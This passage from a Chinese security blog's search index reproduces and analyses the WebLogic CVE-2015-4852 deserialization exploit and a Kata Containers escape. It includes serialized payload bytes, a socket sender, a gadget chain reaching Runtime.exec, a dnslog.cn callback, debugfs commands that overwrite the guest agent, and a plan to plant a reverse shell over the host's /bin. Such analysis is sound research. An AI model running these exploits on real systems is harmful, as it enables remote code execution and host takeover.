\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\xe6\\xf7\\x23\\xe7\\xb8\\xae\\x1e\\xc9\\x02\\x00\\x09\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x4c\\x00\\x09\\x69\\x6d\\x70\\x6c\\x54\\x69\\x74\\x6c\\x65\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0a\\x69\\x6d\\x70\\x6c\\x56\\x65\\x6e\\x64\\x6f\\x72\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0b\\x69\\x6d\\x70\\x6c\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x05\\x78\\x70\\x77\\x02\\x00\\x00\\x78\\xfe\\x00\\xff\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x13\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x4a\\x56\\x4d\\x49\\x44\\xdc\\x49\\xc2\\x3e\\xde\\x12\\x1e\\x2a\\x0c\\x00\\x00\\x78\\x70\\x77\\x46\\x21\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x09\\x31\\x32\\x37\\x2e\\x30\\x2e\\x31\\x2e\\x31\\x00\\x0b\\x75\\x73\\x2d\\x6c\\x2d\\x62\\x72\\x65\\x65\\x6e\\x73\\xa5\\x3c\\xaf\\xf1\\x00\\x00\\x00\\x07\\x00\\x00\\x1b\\x59\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x78\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x13\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x4a\\x56\\x4d\\x49\\x44\\xdc\\x49\\xc2\\x3e\\xde\\x12\\x1e\\x2a\\x0c\\x00\\x00\\x78\\x70\\x77\\x1d\\x01\\x81\\x40\\x12\\x81\\x34\\xbf\\x42\\x76\\x00\\x09\\x31\\x32\\x37\\x2e\\x30\\x2e\\x31\\x2e\\x31\\xa5\\x3c\\xaf\\xf1\\x00\\x00\\x00\\x00\\x00\\x78'# adjust header for appropriate message lengthpayload=struct.pack('&gt;I',len(payload)) + payload[4:]print '[+] Sending payload...'sock.send(payload)data = sock.recv(1024)print &gt;&gt;sys.stderr, 'received \"%s\"' % data 复现结果以漏洞exp2为例，利用漏洞向目标服务器发送payload后的执行结果如下图所示。 12#payload执行的命令为ping xys3si.dnslog.cnpython2 weblogic_t3.py 192.168.22.137 7001 CVE_2015_4852.ser 4.原理分析4.1 分析sink触发点接下来跟进代码对漏洞进行分析，因为我们已经定位该漏洞所在的jar包，因此直接将该jar包添加为库，发送exp启用远程调试进行分析。 首先分析sink点函数，在Collections组件中提供了一个非常重要的类: org.apache.commons.collections.functors.InvokerTransformer，这个类实现了:java.io.Serializable接口。 InvokerTransformer类同时也实现了org.apache.commons.collections.Transformer接口,Transformer提供了一个对象转换方法：transform，主要用于将输入对象转换为输出对象。InvokerTransformer类的主要作用就是利用Java反射机制来创建类实例。 123456//input为我们可控的类，payload中传入了java.lang.RuntimeClass cls = input.getClass();//反射获取方法名，其中iMethodName为方法名，iParamTypes为该方法的参数类型Method method = cls.getMethod(this.iMethodName, this.iParamTypes);//反射执行方法，iArgs为具体执行的命令，for example:ping XXXreturn method.invoke(input, this.iArgs); 由上可知，我们可以通过InvokerTransformer的构造方法，传入我们想要的某个类的方法名，参数类型，具体的参数值，从而执行相应的方法，构造函数如下： 123456789public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args;}//payload中的使用方法new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}),new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),new InvokerTransformer(\"exec\", new Class[]{String[].class}, new Object[]{new String[]{\"/bin/bash\", \"-c\", cmd}}) 因为我们要执行的方法属于java.lang.Runtime类对象，因此首先需要传入的便是java.lang.Runtime这个类对象，ConstantTransformer类是Transformer接口的实现类，其中ConstantTransformer类重写了接口类的transformer方法 对应payload为： 1new ConstantTransformer( Runtime.class ) 通过ConstantTransformer类的transform方法获取一个对象类型，如transform参数是Runtime.class时，调用ConstantTransformer类的transform方法，执行后返回java.lang.Runtime类 org.apache.commons.collections.functors.ChainedTransformer类实现了Transformer链式调用，我们只需要传入一个Transformer数组ChainedTransformer就可以实现依次的去调用每一个Transformer的transform方法。 对应payload为： 1234567Transformer[] tarray = new Transformer[]{ new ConstantTransformer( Runtime.class ), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String[].class}, new Object[]{new String[]{\"/bin/bash\", \"-c\", cmd}})}; 4.2 ChainedTransformer的transform下断点分析因此，第一次我们在transform下断点，跟进代码流程如下： 下一步,input为entrySet的值，返回的object的值是java.lang.Runtime 下一步，i的值+1，Object为java.lang.Runtime，进入InvokerTransformer的transform方法，判断input是否为空，此处不为空，所以进入else所在语句，下一步； 方法名getMethod，传入参数类型为String.class, Class[].class，通过method.invoke方法，相当于执行下面的语句 1234method = java.lang.Runtime.getMethod(\"getMethod\",new Class[]{String.class, Class[].class})method.invoke(java.lang.Runtime,new Object[]{\"getRuntime\", new Class[0]}) //等价于：java.lang.Runtime.getMethod(new Object[]{\"getRuntime\", new Class[0]}) 继续跟进，i的值为2,object的值已经变成了java.lang.Runtime.getRuntime() 相当于执行了下面的语句 1234method = java.lang.Runtime.getRuntime().getMethod(\"invoke\",new Class[]{Object.class, Object[].class})method.invoke(java.lang.Runtime.getRuntime(),new Object[]{null, new Object[0]}) //等价于：java.lang.Runtime.getRuntime().invoke(new Object[]{null, new Object[0]}) 经过上面的步骤就获取了Runtime的实例，同时i=3 最后一次，获取exec方法，相当于执行下面的命令 1234method = runtime.getMethod(\"exec\",new Class[]{String[].class})method.invoke(runtime,new Object[]{new String[]{\"/bin/bash\", \"-c\", cmd}}) //等价于：runtime.exec(new Object[]{new String[]{\"/bin/bash\", \"-c\", cmd}}) 最后，返回一个运行中的进程，执行了传入命令 4.3 分析如何触发sink调用链现在我们已经使用InvokerTransformer创建了一个含有恶意调用链的Transformer类的对象，紧接着我们应该思考如何才能够将调用链窜起来并执行，即如何通过某个类的某个方法触发transform()方法。通过分析代码发现调用transform()方法有以下两个类： TransformedMap（setValue ==&gt; checkSetValue ==&gt; valueTransformer.transform(value)，请自行跟进代码） LazyMap 限于篇幅内容，由于commons collections的触发方法多种多样，感兴趣的读者可以研究ysoserial工具源码进行学习。本文主要从所使用的payload出发，以LazyMap为例进行讲解。 LazyMap实现了Map与Serializable接口，由于需要触发的是transform方法，因此需要找到一个函数能够调用transform方法，查看源代码，发现LazyMap的get方法会调用transform方法，且调用者是this.factory（正好是Transformer对象） 跟进factory，可以发现，该变量是final修饰的Transformer变量，且可以通过调用public static Map decorate(Map map, Transformer factory)返回一个LazyMap的实例，为factory赋值为ChainedTransformer的对象，从而间接触发命令执行 4.4 LazyMap的get方法下断点调试 调用ChainedTransformer的transform方法执行，执行过程同4.2，在此不再阐述。 4.5 分析source入口函数经过上面的分析，我们已经知道除了source入口之外的调用链： 123456789101112-&gt;LazyMap.get() -&gt;ChainedTransformer.transform() -&gt;ConstantTransformer.transform() -&gt;InvokerTransformer.transform() -&gt;Method.invoke() -&gt;Class.getMethod() -&gt;InvokerTransformer.transform() -&gt;Method.invoke() -&gt;Runtime.getRuntime() -&gt;InvokerTransformer.transform() -&gt;Method.invoke() -&gt;Runtime.exec() 那么，现在剩下的工作就是找一个source入口函数，使得当服务器端进行反序列化，即执行readObject()函数的时候能够自动触发整个调用链，而不是我们自己手动触发。 那么需要找一个什么样的类呢，这里主要从LazyMap的get方法出发去找，为了能够调用LazyMap.get方法，首先这个类必定有一个属性是Map类型的，且这个类至少也是实现了Serializable类的。 经过一番寻找，找到了AnnotationInvocationHandler，该类是java运行库中的一个类，并且包含一个可控的Map对象属性memberValues，其readObject方法有自动修改自身Map属性的操作。因此，我们可以尝试找该属性调用get方法的地方，这样一旦将memberValues设置为LazyMap的实例，就会触发LazyMap的get方法，进一步触发命令执行 可以看到AnnotationInvocationHandler实现了InvocationHandler接口，其中的invoke方法会触发get方法的执行，因此，此时就会自然而然想到如何执行invoke方法呢？那就不得不说一下动态代理技术。 动态代理比较常见的用处就是：一方面是代为执行具体类实例的方法，另一方面则在不修改类的源码的情况下,通过代理的方式为类的方法提供更多的功能。 一个简单的demo如下：(示例代码出处：https://www.freebuf.com/articles/web/214096.html) Work接口需要实现work函数 123public interface Work { public String work();} Teacher类实现了Work接口 1234567public class Teacher implements Work{ @Override public String work() { System.out.println(\"my work is teach students\"); return \"Teacher\"; }} WorkHandler用来处理被代理对象，它必须继承InvocationHandler接口，并实现invoke方法 12345678910111213141516171819202122232425import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class WorkHandler implements InvocationHandler{ //代理类中的真实对象 private Object obj; //构造函数，给我们的真实对象赋值 public WorkHandler(Object obj) { this.obj = obj; } /** * proxy:代表动态代理对象 * method：代表正在执行的方法 * args：代表调用目标方法时传入的实参 */ @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { //在真实的对象执行之前我们可以添加自己的操作 System.out.println(\"before invoke。。。\"); //java的反射功能，用来调用obj对象的method方法，传入参数为args Object invoke = method.invoke(obj, args); //在真实的对象执行之后我们可以添加自己的操作 System.out.println(\"after invoke。。。\"); return invoke; }} 在Test类中通过Proxy.newProxyInstance创建动态代理对象proxy，这样当我们调用代理对象proxy的work方法的时候，实际上调用的是WorkHandler的invoke方法。 1234567891011121314151617181920import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;public class Test { public static void main(String[] args) { //要代理的真实对象 Work people = new Teacher(); //代理对象的调用处理程序，我们将要代理的真实对象传入代理对象的调用处理的构造函数中， //最终代理对象的调用处理程序会调用真实对象的方法 InvocationHandler handler = new WorkHandler(people); /** * 通过Proxy类的newProxyInstance方法创建代理对象，我们来看下方法中的参数 * 第一个参数：people.getClass().getClassLoader()，使用handler对象的classloader对象来加载我们的代理对象 * 第二个参数：people.getClass().getInterfaces()，这里为代理类提供的接口是真实对象实现的接口， 这样代理对象就能像真实对象一样调用接口中的所有方法 * 第三个参数：handler，我们将代理对象关联到上面的InvocationHandler对象上 */ Work proxy = (Work)Proxy.newProxyInstance(people.getClass().getClassLoader(), people.getClass().getInterfaces(), handler); System.out.println(proxy.work()); }} 看一下输出结果，我们再没有改变Teacher类的前提下通过代理Work接口，实现了work函数调用的重写。 1234before invoke。。。my work is teach studentsafter invoke。。。Teacher 综上所述：Proxy.newProxyInstance(people.getClass().getClassLoader(), people.getClass().getInterfaces(), handler);则是实现创建了一个接口的动态代理类及动态代理类对象，并指明了三个参数：用哪个类加载器加载这个类，该动态代理类实现了该接口所有方法，当调用接口中实现的任意方法时由谁去处理被代理对象（invoke方法）； 针对上例，则是创建了一个代理了Work接口的动态代理类，当动态代理类对象proxy调用所代理接口Work中的任意方法时都会进入WorkHandler的invoke方法去执行被代理对象的方法及其他相应操作，这里被代理的实际对象为Teacher，因此会执行Teacher的work方法。 在java的java.lang.reflect包下提供了一个Proxy类和一个InvocationHandler接口，通过这个类和这个接口可以生成JDK动态代理类和动态代理对象。生成动态代理类及对象的方法如下：(代码中涉及的Person接口类仅仅是一个示例)。 1234//创建一个与代理对象相关联的InvocationHandlerInvocationHandler stuHandler = new MyInvocationHandler&lt;Person&gt;(stu);//创建一个代理对象stuProxy，代理对象的每个执行方法都会替换执行Invocation中的invoke方法Person stuProxy= (Person) Proxy.newProxyInstance(Person.class.getClassLoader(), new Class&lt;?&gt;[]{Person.class}, stuHandler); 有关动态代理与静态代理更多的内容介绍，请参考：java动态代理实现与原理详细分析，本文不做具体阐述。 言归正传，回到我们所使用的payload,其生成的代理类的代码如下： 因为sun.reflect.annotation.AnnotationInvocationHandler是一个内部API专用的类，在外部我们无法通过类名创建出AnnotationInvocationHandler类实例，所以我们需要通过反射的方式创建出AnnotationInvocationHandler对象： 1234567891011121314151617//通过Java反射获取AnnotationInvocationHandler类对象Class clazz = Class.forName( \"sun.reflect.annotation.AnnotationInvocationHandler\" );//获取AnnotationInvocationHandler的构造方法Constructor cons = clazz.getDeclaredConstructor( Class.class, Map.class );//设置构造方法访问权限cons.setAccessible( true );//创建一个与代理对象相关联的InvocationHandler，设置的同时this.memberValues = lazyMap;InvocationHandler ih = ( InvocationHandler )cons.newInstance( Override.class, lazyMap );//创建一个代理对象mapProxy来代理Map类接口，代理对象的每个执行方法都会替换执行InvocationHandler中的invoke方法Map mapProxy = ( Map ) Proxy.newProxyInstance ( Map.class.getClassLoader(), new Class[] { Map.class }, ih);//创建一个AnnotationInvocationHandler的实例用于序列化，并将this.memberValues = mapProxy;Object obj = cons.newInstance( Override.class, mapProxy ); 这样当执行反序列化操作的时候，会自动调用this.memberValues.entrySet()方法，如下图所示 这样，由于是动态代理类，当调用mapProxy的entrySet方法时，会自动进入AnnotationInvocationHandler的invoke方法，进行判断 从而执行lazyMap的get方法 至此，整个链全部打通，完整的调用链如下： 1234567891011121314151617Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() 4.6 AnnotationInvocationHandler.readObject()下断点调试在source入口点下断点远程调试如下： F5进入，下一步 开始调用mapProxy的entrySet方法 下一步进入invoke方法，这里var2=java.util.Set java.util.Map.entrySet(),var1是mapProxy, 因此var4的值不会进入if，会进入else 进入else后再次判断var4的值，则进入Object var6所在代码 此时，因为this.memberValues被设置为lazyMap，因此触发了lazyMap的get方法，相当于执行了lazyMap.get(“entrySet”) 从而进入了get方法 判断是否包含这个key,进入59行 执行transform,相当于执行ChainedTransform.transform(“entrySet”) 最终调用命令执行 此时已经完成命令执行 至此，整个执行过程和自动过程分析完成。 5.漏洞修复​ 该部分摘自https://blog.csdn.net/simonnews/article/details/105765017， ApacheCommons Collections组件修复：ApacheCommons Collections已经在3.2.2版本中做了修复，对这些不安全的Java类的序列化支持增加开关，默认为关闭状态，涉及的类包括CloneTransformer, ForClosure, InstantiateFactiory，InstantiateTransformer，InvokerTransformer，PrototypeCloneFactory，PrototypeSerialiZationFactory，WhileClosure。 weblogic修复补丁：CVE-2015-4852补丁主要应用在三个位置上，主要是进行黑名单绕过 6.参考文献 https://blog.csdn.net/simonnews/article/details/105765017 https://www.freebuf.com/articles/web/214096.html https://www.cnblogs.com/0x7e/p/14529949.html https://www.chabug.org/audit/1151.html https://www.cnblogs.com/gonjan-blog/p/6685611.html https://functfan.gitbook.io/gewuzz/java-an-quan/fan-xu-lie-hua-lou-dong/ysoserial/java-fan-xu-lie-hua-zhi-commonscollections https://badcode.cc/2018/03/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommons-Collections/ https://zhuanlan.zhihu.com/p/29804811 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://functfan.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"CVE-2015-4852,Weblogic,反序列化","slug":"CVE-2015-4852-Weblogic-反序列化","permalink":"https://functfan.github.io/tags/CVE-2015-4852-Weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"weblogic环境部署与远程调试","slug":"weblogic环境部署与远程调试","date":"2021-06-16T02:09:31.000Z","updated":"2021-06-16T03:04:28.747Z","comments":true,"path":"posts/2831946175/","link":"","permalink":"https://functfan.github.io/posts/2831946175/","excerpt":"","text":"主要内容​ 因为最近要学习weblogic以及对其历史漏洞展开研究，包括漏洞基本原理分析，跟进代码审计，挖掘思路总结，修复方式整理，因此需要临时搭建一个weblogic环境以方便复现和调试代码（关键），经过前期的调研后，已经总结了windows上面和linux安装weblogic的方法，但由于平时使用linux系统多一点，因此选择在linux上面部署weblogic，于是乎调研了一番，最终以方便，快速，自动化为特征选择了奇安信师傅们开发的一款工具（参考链接），下面将具体搭建与调试步骤记录如下，以做总结。 环境部署​ 此方法要求机器上已经安装docker，如果未安装可以自行查找相关文档，此处不再介绍。安装完docker以后，对于weblogic的具体搭建过程则包括weblogic安装包下载，以及jdk包下载等过程，下面详细说明。 从github(国外)或者gitee(国内，速度快)将安装脚本克隆到本地虚拟机： cd切换到克隆后的目录，创建jdks与weblogics目录 1mkdir jdks &amp;&amp; mkdir weblogics 执行安装脚本：(这里以weblogic10.3.6.0+jdk7u21为例说明) 1./run_weblogic1036jdk7u21.sh 安装过程截图 安装完成 开启调试模式 通过url访问可看到已经部署成功。并已默认开启了远程调试模式。 导出weblogic的依赖Jar包进行远程调试 8.1 查看weblogic容器进程 8.2 使用下面的命令导出jar包,并导出tar.gz文件方便在装有IDEA的机器中进行远程调试 123456789#进入容器sudo docker exec -it weblogic1036jdk7u21 /bin/bashcd /u01/app/oracle/cp -r middleware/ /root/WeblogicEnvironment-master/exit#宿主机执行sudo docker cp 7a84dc24433b:/root/WeblogicEnvironment-master . sudo chown -R user:user WeblogicEnvironment-mastertar czvf newfile.tar.gz WeblogicEnvironment-master （该步骤开启的可忽略）如果默认没开启，则按照以下步骤开启。 9.1 修改docker-compose.yml文件，开启8453端口 9.2 编辑配置脚本 12cd u01/app/oracle/Domains/ExampleSilentWTDomain/bin/vi setDomainEnv.sh 9.3 添加两行代码 12debugFlag=\"true\"export debugFlag 远程调试 打开idea，创建一个Java web工程，在idea中File-&gt;Project Structure里找到Libraries，添加modules。 然后配置远程调试，填写远程IP以及端口。 以CVE-2015-4852为例，因为我们知道是 commons-collections的InvokerTransformer出现的问题，所以断点直接下在transform()，开启idea的debug，然后用exp打过去，发现断点已经成功。 至此，远程调试完成。可以开始后续的代码审计了。 参考文章 https://www.cnblogs.com/0x7e/p/14529949.html https://github.com/QAX-A-Team/WeblogicEnvironment.git document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"环境部署","slug":"环境部署","permalink":"https://functfan.github.io/categories/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"}],"tags":[{"name":"weblogic,环境部署,远程调试","slug":"weblogic-环境部署-远程调试","permalink":"https://functfan.github.io/tags/weblogic-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/"}]},{"title":"KataContainers安全容器逃逸-CVE-2020-2023/2024/2025/2026(转载下)","slug":"KataContainers安全容器逃逸-CVE-2020-2023-2024-2025-2026（下）","date":"2021-03-05T08:12:56.000Z","updated":"2021-03-05T09:38:37.480Z","comments":true,"path":"posts/3535913925/","link":"","permalink":"https://functfan.github.io/posts/3535913925/","excerpt":"","text":"逃逸复现环境准备 我们需要准备一套存在前述三个漏洞的Kata Containers环境，并配置其使用Cloud Hypervisor作为虚拟机管理程序。这里，笔者采用VMWare + Ubuntu18.04 + Docker + Kata Containers 1.10.0作为测试环境。 首先，参照官方文档安装Docker[9]。接着，从Kata Containers官方Github仓库[10]下载1.10.0版本的静态程序包kata-static-1.10.3-x86_64.tar.xz，下载后进行安装即可，具体可参考如下步骤（需要root权限）： 12345678910111213141516171819202122232425262728293031323334353637383940#!/bin/bashset -e -x# 下载安装包（如果已经下载，此步可跳过）#wget https://github.com/kata-containers/runtime/releases/download/1.10.0/kata-static-1.10.0-x86_64.tar.xztar xf kata-static-1.10.0-x86_64.tar.xzrm -rf /opt/katamv ./opt/kata /optrmdir ./optrm -rf /etc/kata-containerscp -r /opt/kata/share/defaults/kata-containers /etc/# 使用Cloud Hypervisor作为虚拟机管理程序rm /etc/kata-containers/configuration.tomlln -s /etc/kata-containers/configuration-clh.toml /etc/kata-containers/configuration.toml# 配置Dockermkdir -p /etc/docker/cat &lt;&lt; EOF &gt; /etc/docker/daemon.json{ \"runtimes\": { \"kata-runtime\": { \"path\": \"/opt/kata/bin/kata-runtime\" }, \"kata-clh\": { \"path\": \"/opt/kata/bin/kata-clh\" }, \"kata-qemu\": { \"path\": \"/opt/kata/bin/kata-qemu\" } }, \"registry-mirrors\": [\"https://docker.mirrors.ustc.edu.cn/\"]}EOFmkdir -p /etc/systemd/system/docker.service.d/cat &lt;&lt; EOF &gt; /etc/systemd/system/docker.service.d/kata-containers.conf[Service]ExecStart=ExecStart=/usr/bin/dockerd -D --add-runtime kata-runtime=/opt/kata/bin/kata-runtime --add-runtime kata-clh=/opt/kata/bin/kata-clh --add-runtime kata-qemu=/opt/kata/bin/kata-qemu --default-runtime=kata-runtimeEOF# 重载配置&amp;重新启动Dockersystemctl daemon-reload &amp;&amp; systemctl restart docker 安装完成。可以看一下Docker当前配置的runtime是否为Kata Containers： 123root# docker info | grep 'Runtime' Runtimes: kata-runtime runc kata-clh kata-qemu Default Runtime: kata-runtime OK，再尝试使用Kata Containers + Cloud Hypervisor运行一个容器： 12root# docker run --rm -it --runtime=\"kata-clh\" ubuntu uname -aLinux 1998641bad3f 5.3.0-rc3 #1 SMP Thu Jan 16 01:53:44 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 可以看到，容器使用的内核版本为5.3.0-rc3，而我们测试环境宿主机的内核版本为4.15.0-117-generic： 12root# uname -aLinux matrix 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 这说明我们的环境搭建成功。 我们想要模拟的场景如下： 目标环境是一个提供容器服务（Container-as-a-Service）的云虚拟化平台，使用Kata Containers作为容器运行时。该容器服务的用户能够上传自己的镜像并在云平台上运行一个或多个容器。攻击者首先上传恶意镜像，启动一个容器，污染Kata Containers使用的虚拟机镜像；然后再次启动一个恶意容器，此时，Kata Containers使用被污染的虚拟机镜像创建出一个恶意虚拟机，它会欺骗Kata Containers运行时组件（kata-runtime）将恶意容器根文件系统挂载到云平台宿主机上/bin目录下。管理员在使用/bin目录下的工具时触发反弹shell，攻击者收到反弹shell，实现逃逸。 漏洞利用 下图更清晰地展示了整个逃逸流程： 下面，我们就来逐步看一下。 &gt;&gt;&gt;&gt; 1. 构建恶意kata-agent 结合前面漏洞分析部分可知，要利用好CVE-2020-2026漏洞，就需要在kata-agent的gRPC服务器上做文章。 首先拿到kata-agent的源码并切换到1.10.0版本： 12345mkdir -p $GOPATH/src/github.com/kata-containers/cd $GOPATH/src/github.com/kata-containers/git clone https://github.com/kata-containers/agentcd agentgit checkout 1.10.0 在grpc.go文件中，找到CreateSandobx函数，其中有一部分代码是用来将宿主机共享目录挂载到虚拟机中的： 123456mountList, err := addStorages(ctx, req.Storages, a.sandbox)if err != nil { return emptyResp, err}a.sandbox.mounts = mountList 共享目录挂载后，我们才能在里边创建符号链接。因此，在上述代码后面添加创建符号链接的代码即可。 这样一来，当kata-runtime向kata-agent发出CreateSandbox指令时，kata-agent将在共享目录内的rootfs位置创建一个符号链接，指向/bin；此后，当kata-runtime向该位置绑定挂载容器根文件系统时，实际的挂载路径将是宿主机的/bin。 除此之外，我们还需要避免kata-runtime在容器生命周期结束时从/bin卸载容器根文件系统。因此，我们需要想办法在卸载操作之前把共享目录中的rootfs位置重新替换为一个正常的目录。我们注意到，kata-runtime在挂载容器镜像后，还会向kata-agent发出CreateContainer指令，因此，我们可以在kata-agent源码grpc.go文件中的CreateContainer函数内添加删除符号链接、创建正常目录的操作，避免/bin挂载点被卸载。 至此，恶意kata-agent编写完成，make构建一下即可。 &gt;&gt;&gt;&gt; 2. 构建恶意镜像kata-malware-image 从上面的流程图中可以发现，攻击者实际上需要先后创建两个恶意容器。为简单起见，我们只构造一个恶意镜像，它需要完成两个任务： 在第一个容器启动时，利用CVE-2020-2023和CVE-2020-2025漏洞，将底层虚拟机块设备中的kata-agent替换为攻击者准备好的恶意文件； 第二个容器本身不需要做任何事情，但此时由于CVE-2020-2026漏洞的存在，kata-runtime会将容器的根文件系统挂载到宿主机上指定位置（由恶意kata-agent创建的符号链接指定）。因此，镜像中还需要包含反弹shell需要的程序。 第二个任务比较简单，我们只需要在恶意容器的根目录下准备反弹shell程序（建议用C语言编写，另外，网络上有很多反弹shell源码）即可。由于是覆盖到/bin，因此我们可以考虑以/bin下的一些常用命令为反弹shell命名，例如ls等。另外，假如反弹shell程序依赖bash等系统自带shell，那么我们也需要在镜像中准备——一旦/bin被覆盖，/bin/bash及一系列其他shell就不可用了。 第一个任务则稍微复杂一些，需要将上一步中构建好的恶意kata-agent写入底层虚拟机块设备中。我们可以利用现成工具「debugfs」来达到目的。 如「漏洞分析」部分所述，在获取设备号后，直接使用mknod创建设备文件： 1mknod --mode 0600 /dev/guest_hd b 254 1 接着，就可以用debugfs打开该设备进行操作了（利用漏洞CVE-2020-2023）。默认情况下，直接执行debugfs会进入交互式界面。我们也可以借助它的-f参数，以文件形式给出操作指令。具体操作如下： 123456/sbin/debugfs -w /dev/guest_hd# 以下在debugfs的交互命令行中执行cd /usr/binrm kata-agentwrite /evil-kata-agent kata-agentclose -a 由于CVE-2020-2025漏洞的存在，上述操作会直接将Kata Containers使用的虚拟机镜像中的kata-agent替换为恶意程序，任务完成。 将上述步骤制作成容器镜像即可。 &gt;&gt;&gt;&gt; 3. 向目标环境上传恶意镜像 我们模拟的是针对提供容器服务的云平台场景的攻击，云平台一般会提供上传或拉取镜像的方法。为简单起见，笔者直接在目标主机上构建恶意镜像。 &gt;&gt;&gt;&gt; 4. 发起攻击 万事俱备，只欠东风。攻击者现在只需要做三件事： 开启一个监听反弹shell的进程； 在目标环境上使用恶意镜像创建一个新容器； 在上一容器内的恶意脚本执行完后，继续使用恶意镜像创建第二个容器。 可以编写一个简单的脚本来自动化上述步骤： 如上图所示，攻击成功（覆盖kata-agent可能耗时较久）。此时目标宿主机上的/bin目录已经被恶意镜像的根目录覆盖（绑定挂载）。假设此时管理员登录到了宿主机上，执行了一些常用命令，例如ls： 由于ls已经被替换为恶意程序，此时，攻击者收到了目标宿主机反弹回来的shell： &gt;&gt;&gt;&gt; 注意事项 如果在VMWare中搭建测试环境，使用Kata Containers运行容器前需要配置一下vsock[15]： 123sudo systemctl stop vmware-toolssudo modprobe -r vmw_vsock_vmci_transportsudo modprobe -i vhost_vsock 构建恶意镜像时，使用runC构建会比直接在配置好kata-runtime的环境中快很多。 事实上，对于攻击者来说，覆盖/bin并非是最好的思路。一方面，他在反弹shell中能够用到的工具会减少——原宿主机上/bin目录下的所有工具都无法使用了；另一方面，攻击者需要管理员的配合（管理员执行ls等命令）才能实现攻击。一种更好的思路是覆盖/lib或/lib64目录并提供恶意的动态链接库[8]，这样既不会影响到/bin目录下的工具（严格来说，可能会影响一些使用到动态链接库的程序），又不需要管理员的配合就可实施攻击，因为许多系统进程（以及kata-runtime）都会自动去调用动态链接库中的函数。 漏洞修复在了解漏洞原理后，修复思路就显而易见了。修复细节不是本文关注的重点，感兴趣的读者可以参考官方仓库[27][28][29][30]。 总结纵观云计算与虚拟化技术发展可以发现，从虚拟机到容器再到安全容器，每一种技术都曾出现过逃逸情况。笔者相信，未来还会不断有新的逃逸方式出现。当然，我们不会因噎废食，科技的进步会在效率和安全性两方面都带来越来越多的增益。但是另一方面，最小权限、纵深防御等安全最佳实践和原则依然有必要贯穿始终。 致谢研究过程中，笔者曾就技术细节问题向原漏洞发现者、Palo Alto Networks的高级安全研究员Yuval Avrahami请教，得到其热情友好的帮助，在此向Yuval Avrahami表示真诚的感谢。 参考文献[1] https://i.blackhat.com/USA-20/Thursday/us-20-Avrahami-Escaping-Virtualized-Containers.pdf[2] https://katacontainers.io[3] https://katacontainers.io/learn/[4] https://gvisor.dev[5] 